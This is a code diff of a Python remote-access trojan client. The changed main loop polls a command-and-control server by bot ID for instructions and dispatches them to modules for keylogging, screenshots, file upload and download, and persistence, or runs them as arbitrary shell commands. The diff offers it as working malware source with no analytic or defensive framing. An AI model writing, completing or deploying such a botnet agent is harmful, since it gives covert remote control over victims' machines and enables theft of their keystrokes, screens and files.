@@ -1,17 +1,17 @@
 #!/usr/bin/env python
 
 import time
-import sys
 import os
+import requests
+import sys
 
-import server
+import settings
 from modules import runcmd
-from modules import download
-from modules import screenshot
-from modules import upload
 from modules import persistence
+from modules import download
+from modules import upload
 from modules import keylogger
-import settings    
+from modules import screenshot
 
 
 if __name__ == "__main__":
@@ -21,20 +21,17 @@ if __name__ == "__main__":
         if is_idle:
             time.sleep(settings.REQUEST_INTERVAL)
         try:
-            command = server.hello()
+            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID).text
+            cmdargs = command.split(" ")
             if command:
-                if command == "runcmd":
-                    runcmd.run()
-                elif command == "download":
-                    download.run()
-                elif command == "upload":
-                    upload.run()
-                elif command == "screenshot":
-                    screenshot.run()
-                elif command == "persistence":
-                    persistence.run()
-                elif command == "keylogger":
-                    keylogger.run()
+                if settings.DEBUG:
+                    print command
+                if cmdargs[0] == "cd":
+                    os.chdir(" ".join(cmdargs[1:]))
+                if "modules.%s" % cmdargs[0] in sys.modules:
+                    sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
+                else:
+                    runcmd.run(command)
                 last_active = time.time()
                 is_idle = False
             elif time.time() - last_active > settings.IDLE_TIME:
